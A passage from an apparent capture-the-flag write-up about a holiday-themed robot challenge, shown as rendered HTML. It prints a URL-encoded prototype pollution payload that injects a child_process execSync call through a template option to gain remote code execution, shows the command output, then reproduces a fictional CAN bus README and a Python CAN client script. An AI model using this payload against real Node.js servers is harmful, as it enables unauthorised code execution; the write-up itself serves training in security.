</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="p">}</span>
</span></code></pre></div>
<details class="success">
<summary>Prototype pollution request</summary>
<p>We send a request with this payload encoded in the URL as follows:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>%7B%0A%20%20%22action%22:%20%22update%22,%0A%20%20%22key%22:%20%22__proto__%22,%0A%20%20%22subkey%22:%20%22outputFunctionName%22,%0A%20%20%22value%22:%20%22x;return%20global.process.mainModule.require('child_process').execSync('ls').toString();%20//%22%0A%7D
</span></code></pre></div>
<figure>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../media/hack_a_gnome/hack_a_gnome_burp" data-desc-position="bottom"><img alt="answer" src="../../media/hack_a_gnome/hack_a_gnome_burp"></a></p>
<figcaption>
<p>Burp request.</p>
</figcaption>
</figure>
<p>This returns the following when refreshing the statistics page, proving that the exploit works:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>README.md canbus_client.py node_modules package-lock.json package.json server.js views
</span></code></pre></div>
<p>We can now execute code remotely.</p>
</details>
<h3 id="can-bus">CAN Bus<a class="headerlink" href="#can-bus" title="Permanent link">¶</a></h3>
<p>The last step we need to execute is to fix the controls of the robot. Using the RCE exploit in the last step we can learn more about the files on the server:</p>
<details class="note">
<summary>README.md</summary>
<p>This file displays the different CAN IDs in use and indicates that more signals related to controller the robot's movement still have to be implemented.</p>
<div class="language-md highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">README.md</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-8-10">10</a></span>
<span class="normal"><a href="#__codelineno-8-11">11</a></span>
<span class="normal"><a href="#__codelineno-8-12">12</a></span>
<span class="normal"><a href="#__codelineno-8-13">13</a></span>
<span class="normal"><a href="#__codelineno-8-14">14</a></span>
<span class="normal"><a href="#__codelineno-8-15">15</a></span>
<span class="normal"><a href="#__codelineno-8-16">16</a></span>
<span class="normal"><a href="#__codelineno-8-17">17</a></span>
<span class="normal"><a href="#__codelineno-8-18">18</a></span>
<span class="normal"><a href="#__codelineno-8-19">19</a></span>
<span class="normal"><a href="#__codelineno-8-20">20</a></span>
<span class="normal"><a href="#__codelineno-8-21">21</a></span>
<span class="normal"><a href="#__codelineno-8-22">22</a></span>
<span class="normal"><a href="#__codelineno-8-23">23</a></span>
<span class="normal"><a href="#__codelineno-8-24">24</a></span>
<span class="normal"><a href="#__codelineno-8-25">25</a></span>
<span class="normal"><a href="#__codelineno-8-26">26</a></span>
<span class="normal"><a href="#__codelineno-8-27">27</a></span>
<span class="normal"><a href="#__codelineno-8-28">28</a></span>
<span class="normal"><a href="#__codelineno-8-29">29</a></span>
<span class="normal"><a href="#__codelineno-8-30">30</a></span>
<span class="normal"><a href="#__codelineno-8-31">31</a></span>
<span class="normal"><a href="#__codelineno-8-32">32</a></span>
<span class="normal"><a href="#__codelineno-8-33">33</a></span>
<span class="normal"><a href="#__codelineno-8-34">34</a></span>
<span class="normal"><a href="#__codelineno-8-35">35</a></span>
<span class="normal"><a href="#__codelineno-8-36">36</a></span>
<span class="normal"><a href="#__codelineno-8-37">37</a></span>
<span class="normal"><a href="#__codelineno-8-38">38</a></span>
<span class="normal"><a href="#__codelineno-8-39">39</a></span>
<span class="normal"><a href="#__codelineno-8-40">40</a></span>
<span class="normal"><a href="#__codelineno-8-41">41</a></span>
<span class="normal"><a href="#__codelineno-8-42">42</a></span>
<span class="normal"><a href="#__codelineno-8-43">43</a></span>
<span class="normal"><a href="#__codelineno-8-44">44</a></span>
<span class="normal"><a href="#__codelineno-8-45">45</a></span>
<span class="normal"><a href="#__codelineno-8-46">46</a></span>
<span class="normal"><a href="#__codelineno-8-47">47</a></span>
<span class="normal"><a href="#__codelineno-8-48">48</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="gh"># 🎄 GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>Ho ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the <span class="gs">**CAN (Controller Area Network)**</span> bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing. This document details the known signals whizzing around on the <span class="sb">`gcan0`</span> interface. Remember, all multi-byte values are sent <span class="gs">**Big Endian**</span> (Most Significant Byte first), just like how Santa lists the nicest kids first! ---
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="gu">## 🎁 CAN Data Requests (Client -&gt; GnomeBot )</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>Sometimes, you need to poke the GnomeBot to get specific information <span class="ge">_right now_</span>. Send one of these messages, and the <span class="ge">_should_</span> reply with the corresponding Status/Data message (see below).
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>| CAN ID (Hex) | Constant Name             | Description                                         | Data Sent |
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>| :----------- | :------------------------ | :-------------------------------------------------- | :-------- | --- |
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>| <span class="sb">`0x400`</span>      | <span class="sb">`requestBatteryVoltageID`</span> | Asks for the current battery voltage reading.       | (Empty)   |
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>| <span class="sb">`0x470`</span>      | <span class="sb">`requestGPSFixID`</span>         | Inquires about the current GPS fix status.          | (Empty)   |
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>| <span class="sb">`0x410`</span>      | <span class="sb">`requestMotorSpeedLeftID`</span> | Requests the current speed of the left motor.       | (Empty)   |
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>| <span class="sb">`0x460`</span>      | <span class="sb">`requestSystemTempID`</span>     | Asks for the GnomeBot's internal temperature.       | (Empty)   |
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>| <span class="sb">`0x4C0`</span>      | <span class="sb">`requestPayloadStatusID`</span>  | Requests the current status of the payload/gripper. | (Empty)   | --- |
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a><span class="gu">## ✨ CAN Status &amp; Data Responses (GnomeBot -&gt; Client)</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>These messages are the GnomeBot telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a>| CAN ID (Hex) | Constant Name                | Behavior            | Data Bytes | Data Type            | Description &amp; Units/Meaning                                                                 |
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22"></a>| :----------- | :--------------------------- | :------------------ | :--------- | :------------------- | :------------------------------------------------------------------------------------------ | --- |
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23"></a>| <span class="sb">`0x300`</span>      | <span class="sb">`statusBatteryVoltageID`</span>     | Response Only       | 2          | <span class="sb">`uint16`</span>             | Battery voltage in <span class="gs">**millivolts (mV)**</span>. E.g., <span class="sb">`0x30D4`</span> = 12500mV = 12.5V.                   |
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24"></a>| <span class="sb">`0x310`</span>      | <span class="sb">`statusMotorSpeedLeftID`</span>     | Periodic + Response | 2          | <span class="sb">`int16`</span>              | Left motor speed in <span class="gs">**RPM**</span>. Can be negative for reverse!                                   |
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25"></a>| <span class="sb">`0x311`</span>      | <span class="sb">`statusMotorSpeedRightID`</span>    | Periodic            | 2          | <span class="sb">`int16`</span>              | Right motor speed in <span class="gs">**RPM**</span>.                                                               |
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26"></a>| <span class="sb">`0x320`</span>      | <span class="sb">`statusSonarDistanceFrontID`</span> | Periodic            | 2          | <span class="sb">`uint16`</span>             | Front sonar distance reading in <span class="gs">**centimeters (cm)**</span>.                                       |
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27"></a>| <span class="sb">`0x321`</span>      | <span class="sb">`statusSonarDistanceRearID`</span>  | Periodic            | 2          | <span class="sb">`uint16`</span>             | Rear sonar distance reading in <span class="gs">**centimeters (cm)**</span>.                                        |
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28"></a>| <span class="sb">`0x330`</span>      | <span class="sb">`statusIMUDataID`</span>            | Periodic            | 2          | <span class="sb">`byte[0]`</span>, <span class="sb">`byte[1]`</span> | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., <span class="sb">`0x01`</span> = OK).           |
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29"></a>| <span class="sb">`0x340`</span>      | <span class="sb">`statusHeadlightID`</span>          | Periodic            | 1          | <span class="sb">`uint8`</span>              | Headlight status: <span class="sb">`0x00`</span> = Off, <span class="sb">`0x01`</span> = On. Is it Rudolph's spare nose?                    |
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30"></a>| <span class="sb">`0x350`</span>      | <span class="sb">`statusWifiStatusID`</span>         | Periodic            | 2          | <span class="sb">`byte[0]`</span>, <span class="sb">`byte[1]`</span> | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (<span class="sb">`0`</span>=Disc, <span class="sb">`1`</span>=Conn).                 |
</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31"></a>| <span class="sb">`0x351`</span>      | <span class="sb">`statusBluetoothStatusID`</span>    | Periodic            | 2          | <span class="sb">`byte[0]`</span>, <span class="sb">`byte[1]`</span> | Byte 0: Number of paired devices. Byte 1: Status (<span class="sb">`0`</span>=Off, <span class="sb">`1`</span>=On, <span class="sb">`2`</span>=Paired).             |
</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32"></a>| <span class="sb">`0x360`</span>      | <span class="sb">`statusSystemTempID`</span>         | Periodic + Response | 1          | <span class="sb">`int8`</span>               | Internal system temperature in <span class="gs">**degrees Celsius (°C)**</span>. Keep it cool, like the North Pole! |
</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33"></a>| <span class="sb">`0x370`</span>      | <span class="sb">`statusGPSFixID`</span>             | Response Only       | 1          | <span class="sb">`uint8`</span>              | GPS Fix Status: <span class="sb">`0`</span> = No Fix, <span class="sb">`1`</span> = 2D Fix, <span class="sb">`2`</span> = 3D Fix.                                   |
</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34"></a>| <span class="sb">`0x380`</span>      | <span class="sb">`statusWheelOdomLeftID`</span>      | Periodic            | 4          | <span class="sb">`uint32`</span>             | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                            |
</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35"></a>| <span class="sb">`0x381`</span>      | <span class="sb">`statusWheelOdomRightID`</span>     | Periodic            | 4          | <span class="sb">`uint32`</span>             | Cumulative right wheel odometry ticks.                                                      |
</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36"></a>| <span class="sb">`0x390`</span>      | <span class="sb">`statusAmbientLightID`</span>       | Periodic            | 2          | <span class="sb">`uint16`</span>             | Ambient light sensor reading in <span class="gs">**Lux**</span>. Brighter than Rudolph's nose?                      |
</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37"></a>| <span class="sb">`0x391`</span>      | <span class="sb">`statusHumidityID`</span>           | Periodic            | 1          | <span class="sb">`uint8`</span>              | Relative humidity percentage (%). Is it snowing?                                            |
</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38"></a>| <span class="sb">`0x392`</span>      | <span class="sb">`statusPressureID`</span>           | Periodic            | 4          | <span class="sb">`uint32`</span>             | Barometric pressure in <span class="gs">**Pascals (Pa)**</span>.                                                    |
</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39"></a>| <span class="sb">`0x3A0`</span>      | <span class="sb">`statusCurrentDrawID`</span>        | Periodic            | 2          | <span class="sb">`int16`</span>              | Main battery current draw in <span class="gs">**milliamps (mA)**</span>. How much juice does this thing use?!       |
</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40"></a>| <span class="sb">`0x3B0`</span>      | <span class="sb">`statusEstopStatusID`</span>        | Periodic            | 1          | <span class="sb">`uint8`</span>              | Emergency Stop Status: <span class="sb">`0x00`</span> = OK, <span class="sb">`0x01`</span> = PRESSED! (Hopefully not!)                      |
</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41"></a>| <span class="sb">`0x3C0`</span>      | <span class="sb">`statusPayloadStatusID`</span>      | Periodic + Response | 1          | <span class="sb">`uint8`</span> (Bitmap)     | Payload Status: Bit 0 (<span class="sb">`0x01`</span>): Gripper Open, Bit 1 (<span class="sb">`0x02`</span>): Sensor Active.                |
</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42"></a>| <span class="sb">`0x3D0`</span>      | <span class="sb">`statusNavStatusID`</span>          | Periodic            | 1          | <span class="sb">`uint8`</span>              | Navigation System Status: <span class="sb">`0`</span>=Idle, <span class="sb">`1`</span>=Navigating, <span class="sb">`2`</span>=Reached, <span class="sb">`3`</span>=Failed.                |
</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43"></a>| <span class="sb">`0x3E0`</span>      | <span class="sb">`statusFanSpeedID`</span>           | Periodic            | 1          | <span class="sb">`uint8`</span>              | Cooling fan speed percentage (%). Keeping the circuits frosty.                              |
</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44"></a>| <span class="sb">`0x3FF`</span>      | <span class="sb">`statusHeartbeatID`</span>          | Periodic            | 1          | <span class="sb">`uint8`</span>              | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!          | --- |
</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45"></a>
</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46"></a><span class="gu">## 🛠️ Movement Commands &amp; Acknowledgments (Client &lt;-&gt; GnomeBot )</span>
</span><span id="__span-8-47"><a id="__codelineno-8-47" name="__codelineno-8-47"></a>
</span><span id="__span-8-48"><a id="__codelineno-8-48" name="__codelineno-8-48"></a><span class="sb">`TODO: There are more signals related to controlling the GnomeBot's movement (Up/Down/Left/Right) and the acknowledgments sent back by the bot. These involve CAN IDs that are not totally settled yet. We are still polishing the documentation for these - check back after eggnog break!`</span> ---
</span></code></pre></div></td></tr></tbody></table></div>
</details>
<details class="note">
<summary>canbus_client.py</summary>
<p>This file contains the logic to listen to the CAN bus and send commands. It contains the faulty commands to move the robot; these must be replaced with the correct IDs. There is also <code>listen</code> functionality to understand what is being sent over the CAN bus but it didn't provide us with relevant information.</p>
<div class="language-python highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">canbus_client.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-9-10">10</a></span>
<span class="normal"><a href="#__codelineno-9-11">11</a></span>
<span class="normal"><a href="#__codelineno-9-12">12</a></span>
<span class="normal"><a href="#__codelineno-9-13">13</a></span>
<span class="normal"><a href="#__codelineno-9-14">14</a></span>
<span class="normal"><a href="#__codelineno-9-15">15</a></span>
<span class="normal"><a href="#__codelineno-9-16">16</a></span>
<span class="normal"><a href="#__codelineno-9-17">17</a></span>
<span class="normal"><a href="#__codelineno-9-18">18</a></span>
<span class="normal"><a href="#__codelineno-9-19">19</a></span>
<span class="normal"><a href="#__codelineno-9-20">20</a></span>
<span class="normal"><a href="#__codelineno-9-21">21</a></span>
<span class="normal"><a href="#__codelineno-9-22">22</a></span>
<span class="normal"><a href="#__codelineno-9-23">23</a></span>
<span class="normal"><a href="#__codelineno-9-24">24</a></span>
<span class="normal"><a href="#__codelineno-9-25">25</a></span>
<span class="normal"><a href="#__codelineno-9-26">26</a></span>
<span class="normal"><a href="#__codelineno-9-27">27</a></span>
<span class="normal"><a href="#__codelineno-9-28">28</a></span>
<span class="normal"><a href="#__codelineno-9-29">29</a></span>
<span class="normal"><a href="#__codelineno-9-30">30</a></span>
<span class="normal"><a href="#__codelineno-9-31">31</a></span>
<span class="normal"><a href="#__codelineno-9-32">32</a></span>
<span class="normal"><a href="#__codelineno-9-33">33</a></span>
<span class="normal"><a href="#__codelineno-9-34">34</a></span>
<span class="normal"><a href="#__codelineno-9-35">35</a></span>
<span class="normal"><a href="#__codelineno-9-36">36</a></span>
<span class="normal"><a href="#__codelineno-9-37">37</a></span>
<span class="normal"><a href="#__codelineno-9-38">38</a></span>
<span class="normal"><a href="#__codelineno-9-39">39</a></span>
<span class="normal"><a href="#__codelineno-9-40">40</a></span>
<span class="normal"><a href="#__codelineno-9-41">41</a></span>
<span class="normal"><a href="#__codelineno-9-42">42</a></span>
<span class="normal"><a href="#__codelineno-9-43">43</a></span>
<span class="normal"><a href="#__codelineno-9-44">44</a></span>
<span class="normal"><a href="#__codelineno-9-45">45</a></span>
<span class="normal"><a href="#__codelineno-9-46">46</a></span>
<span class="normal"><a href="#__codelineno-9-47">47</a></span>
<span class="normal"><a href="#__codelineno-9-48">48</a></span>
<span class="normal"><a href="#__codelineno-9-49">49</a></span>
<span class="normal"><a href="#__codelineno-9-50">50</a></span>
<span class="normal"><a href="#__codelineno-9-51">51</a></span>
<span class="normal"><a href="#__codelineno-9-52">52</a></span>
<span class="normal"><a href="#__codelineno-9-53">53</a></span>
<span class="normal"><a href="#__codelineno-9-54">54</a></span>
<span class="normal"><a href="#__codelineno-9-55">55</a></span>
<span class="normal"><a href="#__codelineno-9-56">56</a></span>
<span class="normal"><a href="#__codelineno-9-57">57</a></span>
<span class="normal"><a href="#__codelineno-9-58">58</a></span>
<span class="normal"><a href="#__codelineno-9-59">59</a></span>
<span class="normal"><a href="#__codelineno-9-60">60</a></span>
<span class="normal"><a href="#__codelineno-9-61">61</a></span>
<span class="normal"><a href="#__codelineno-9-62">62</a></span>
<span class="normal"><a href="#__codelineno-9-63">63</a></span>
<span class="normal"><a href="#__codelineno-9-64">64</a></span>
<span class="normal"><a href="#__codelineno-9-65">65</a></span>
<span class="normal"><a href="#__codelineno-9-66">66</a></span>
<span class="normal"><a href="#__codelineno-9-67">67</a></span>
<span class="normal"><a href="#__codelineno-9-68">68</a></span>
<span class="normal"><a href="#__codelineno-9-69">69</a></span>
<span class="normal"><a href="#__codelineno-9-70">70</a></span>
<span class="normal"><a href="#__codelineno-9-71">71</a></span>
<span class="normal"><a href="#__codelineno-9-72">72</a></span>
<span class="normal"><a href="#__codelineno-9-73">73</a></span>
<span class="normal"><a href="#__codelineno-9-74">74</a></span>
<span class="normal"><a href="#__codelineno-9-75">75</a></span>
<span class="normal"><a href="#__codelineno-9-76">76</a></span>
<span class="normal"><a href="#__codelineno-9-77">77</a></span>
<span class="normal"><a href="#__codelineno-9-78">78</a></span>
<span class="normal"><a href="#__codelineno-9-79">79</a></span>
<span class="normal"><a href="#__codelineno-9-80">80</a></span>
<span class="normal"><a href="#__codelineno-9-81">81</a></span>
<span class="normal"><a href="#__codelineno-9-82">82</a></span>
<span class="normal"><a href="#__codelineno-9-83">83</a></span>
<span class="normal"><a href="#__codelineno-9-84">84</a></span>
<span class="normal"><a href="#__codelineno-9-85">85</a></span>
<span class="normal"><a href="#__codelineno-9-86">86</a></span>
<span class="normal"><a href="#__codelineno-9-87">87</a></span>
<span class="normal"><a href="#__codelineno-9-88">88</a></span>
<span class="normal"><a href="#__codelineno-9-89">89</a></span>
<span class="normal"><a href="#__codelineno-9-90">90</a></span>
<span class="normal"><a href="#__codelineno-9-91">91</a></span>
<span class="normal"><a href="#__codelineno-9-92">92</a></span>
<span class="normal"><a href="#__codelineno-9-93">93</a></span>
<span class="normal"><a href="#__codelineno-9-94">94</a></span>
<span class="normal"><a href="#__codelineno-9-95">95</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="ch">#!/usr/bin/python3</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">can</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span> <span class="c1"># To show timestamps for received messages</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="c1"># Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="n">COMMAND_MAP</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a>    <span class="s2">"up"</span><span class="p">:</span> <span class="mh">0x656</span><span class="p">,</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a>    <span class="s2">"down"</span><span class="p">:</span> <span class="mh">0x657</span><span class="p">,</span>
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12"></a>    <span class="s2">"left"</span><span class="p">:</span> <span class="mh">0x658</span><span class="p">,</span>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13"></a>    <span class="s2">"right"</span><span class="p">:</span> <span class="mh">0x659</span><span class="p">,</span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14"></a>    <span class="c1"># Add other command IDs if needed</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15"></a>    <span class="p">}</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16"></a>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17"></a><span class="c1"># Add 'listen' as a special command option</span>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18"></a><span class="n">COMMAND_CHOICES</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span> <span class="o">+</span> <span class="p">[</span><span class="s2">"listen"</span><span class="p">]</span>
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19"></a><span class="n">IFACE_NAME</span> <span class="o">=</span> <span class="s2">"gcan0"</span>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20"></a>
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_id</span><span class="p">):</span> <span class="s2">"""Sends a CAN message with the given command ID."""</span>
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22"></a>    <span class="n">message</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">Message</span><span class="p">(</span>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23"></a>        <span class="n">arbitration_id</span><span class="o">=</span><span class="n">command_id</span><span class="p">,</span>
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24"></a>        <span class="n">data</span><span class="o">=</span><span class="p">[],</span> <span class="c1"># No specific data needed for these simple commands</span>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25"></a>        <span class="n">is_extended_id</span><span class="o">=</span><span class="kc">False</span>
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26"></a>    <span class="p">)</span>
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27"></a>
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29"></a>        <span class="n">bus</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sent command: ID=0x</span><span class="si">{</span><span class="n">command_id</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31"></a>
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32"></a>    <span class="k">except</span> <span class="n">can</span><span class="o">.</span><span class="n">CanError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Error sending message: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34"></a>
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35"></a><span class="k">def</span><span class="w"> </span><span class="nf">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">):</span> <span class="s2">"""Listens for CAN messages and prints them."""</span>
</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Listening for messages on </span><span class="si">{</span><span class="n">bus</span><span class="o">.</span><span class="n">channel_info</span><span class="si">}</span><span class="s2">. Press Ctrl+C to stop."</span><span class="p">)</span>
</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37"></a>
</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39"></a>        <span class="c1"># Iterate indefinitely over messages received on the bus</span>
</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40"></a>        <span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">bus</span><span class="p">:</span>
</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41"></a>            <span class="c1"># Get current time for the timestamp</span>
</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42"></a>            <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">'%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Milliseconds precision</span>
